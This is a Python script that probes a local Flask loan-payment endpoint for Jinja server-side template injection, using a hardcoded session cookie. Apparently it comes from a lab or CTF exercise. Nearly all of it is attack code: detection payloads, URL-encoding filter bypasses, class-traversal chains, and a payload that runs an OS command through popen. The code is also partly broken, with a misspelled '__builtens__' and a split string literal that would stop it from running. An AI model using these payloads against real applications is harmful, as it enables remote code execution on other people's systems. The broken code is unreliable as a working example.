import requests
import urllib.parse
import json

# Session configuration
target_url = "http://127.0.0.1:5000/total_loan_payments"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYTgQ.zxJDgrrGBVoUrTrnwwifgdf1QW0"
headers = {
    "Cookie": f"session={session_cookie}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
}

print("=" * 80)
print("TECHNICAL ANALYSIS: /total_loan_payments Jinja JSON Rendering")
print("=" * 80)

# Test 1: Baseline legitimate request
print("\n[TEST 1] Baseline Legitimate Request")
print("-" * 80)
params = {"principal": "10000", "payment": "500", "term": "24"}
response = requests.get(target_url, params=params, headers=headers, timeout=10)
print(f"URL: {response.url}")
print(f"Status: {response.status_code}")
print(f"Content-Type: {response.headers.get('content-type', 'Not specified')}")
print(f"Response Body:\n{response.text}")

# Attempt to parse as JSON to understand structure
try:
    json_data = json.loads(response.text)
    print(f"\n[PARSED] JSON Structure: {json.dumps(json_data, indent=2)}")
    print(f"[PARSED] Keys: {list(json_data.keys())}")
    print(f"[PARSED] Value Types: {[(k, type(v).__name__) for k, v in json_data.items()]}")
except json.JSONDecodeError as e:
    print(f"[PARSED] Failed to parse JSON: {e}")

# Test 2: SSTI attempt with direct template syntax
print("\n" + "=" * 80)
print("[TEST 2] Direct SSTI Attempt Detection")
print("-" * 80)
test_cases = [
    ("{{7*7}}", "Basic SSTI multiplication"),
    ("{{config}}", "SSTI config object"),
    ("{{7*'7'}}", "String repetition SSTI"),
    ("{% for x in (1..10) %}{{x}}{% endfor %}", "Loop template syntax"),
]

for payload, description in test_cases:
    print(f"\n[ATTEMPT] {description}")
    print(f"Payload: {payload}")
    params = {"principal": payload, "payment": "500", "term": "24"}
    response = requests.get(target_url, params=params, headers=headers, timeout=10)
    print(f"Status: {response.status_code}")
    if response.status_code == 400:
        print(f"Response: {response.text}")

# Test 3: URL Encoding Bypass Attempts
print("\n" + "=" * 80)
print("[TEST 3] URL Encoding Bypass Attempts")
print("-" * 80)
encoded_tests = [
    ("%7B%7B7*7%7D%7D", "URL encoded {{7*7}}"),
    ("%7B%7Bconfig%7D%7D", "URL encoded {{config}}"),
    ("{{%37%2A%37}}", "Partially encoded 7*7"),
]

for payload, description in encoded_tests:
    print(f"\n[ENCODED] {description}")
    print(f"Raw payload: {payload}")
    params = {"principal": payload, "payment": "500", "term": "24"}
    response = requests.get(target_url, params=params, headers=headers, timeout=10)
    print(f"Status: {response.status_code}")
    print(f"Content-Type: {response.headers.get('content-type', 'Not specified')}")
    print(f"Response: {response.text}")

# Test 4: Alternative SSTI Payloads
print("\n" + "=" * 80)
print("[TEST 4] Various SSTI Payload Types")
print("-" * 80)
alternative_payloads = [
    ("{{''.__class__.__mro__[2].__subclasses__()}}", "Class traversal payload"),
    ("{{request.application.__globals__.__builtens__}}", "Request object traversal"),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "OS command via config"),
    ("{{[].__class__.__base__.__subclasses__()}}", "List class traversal"),
]

for payload, description in alternative_payloads:
    print(f"\n[ALT SSTI] {description}")
    params = {"principal": payload, "payment": "500", "term": "24"}
    response = requests.get(target_url, params=params, headers=headers, timeout=10)
    print(f"Status: {response.status_code}")
    if response.status_code == 200:
        print(f"Response: {response.text[:200]}")
    else:
        print(f"Response: {response.text}")

# Test 5: Testing each parameter individually
print("\n" + "=" * 80)
print("[TEST 5] Parameter-Specific Testing")
print("-" * 80)
parameters = ["principal", "payment", "term"]
for param in parameters:
    print(f"\n[PARAM] Testing {param} with {{7*7}}")
    params = {p: ("{{7*7}}" if p == param else "100") for p in parameters}
    response = requests.get(target_url, params=params, headers=headers, timeout=10)
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text}")

# Test 6: Character-by-character filter analysis
print("\n" + "=" * 80)
print("[TEST 6] Character Filter Analysis")
print("-" * 80)
suspicious_chars = ["{", "}", "%", "$", "#", "@", "!", "<", ">", "\"", "'", ";", "|", "&", "`"]
base_value = "100"
for char in suspicious_chars:
    print(f"\n[CHAR TEST] Parameter value: {base_value}{char}")
    params = {"principal": f"{base_value}{char}", "payment": "500", "term": "24"}
    response = requests.get(target_url, params=params, headers=headers, timeout=10)
    print(f"Status: {response.status_code}")
    if response.status_code == 400:
        print(f"Filter triggered on character: '{char}'")
        print(f"Error response: {response.text}")

# Test 7: Testing mathematical vs string inputs
print("\n" + "=" * 80)
print("[TEST 7] Input Type Validation")
print("-" * 80)
math_tests = [
    ("100", "Integer string"),
    ("100.5", "Float string"),
    ("abc", "Non-numeric string"),
    ("-100", "Negative number"),
    ("0", "Zero value"),
    ("1000000000", "Large number"),
]

for value, desc in math_tests:
    print(f"\n[INPUT TYPE] {desc}: '{value}'")
    params = {"principal": value, "payment": "500", "term": "24"}
    response = requests.get(target_url, params=params, headers=headers, timeout=10)
    print(f"Status: {response.status_code}")
    if response.status_code == 200:
        try:
            data = json.loads(response.text)
            print(f"Response JSON: {data}")
        except:
            print(f"Response: {response.text[:100]}")

# Test 8: JSON Generation Mechanism Analysis
print("\n" + "=
"*80)
print("[TEST 8] JSON Generation Mechanism Analysis")
print("-" * 80)
print("Testing JSON generation by examining response structure...")

# Send payload with quotes and special chars
params = {"principal": 'test"value', "payment": "500", "term": "24"}
response = requests.get(target_url, params=params, headers=headers, timeout=10)
print(f"Quote test Status: {response.status_code}")
print(f"Quote test Response: {response.text}")

params = {"principal": "test\\nvalue", "payment": "500", "term": "24"}
response = requests.get(target_url, params=params, headers=headers, timeout=10)
print(f"Newline test Status: {response.status_code}")
print(f"Newline test Response: {response.text}")

# Final analysis summary
print("\n" + "=" * 80)
print("ANALYSIS SUMMARY")
print("=" * 80)
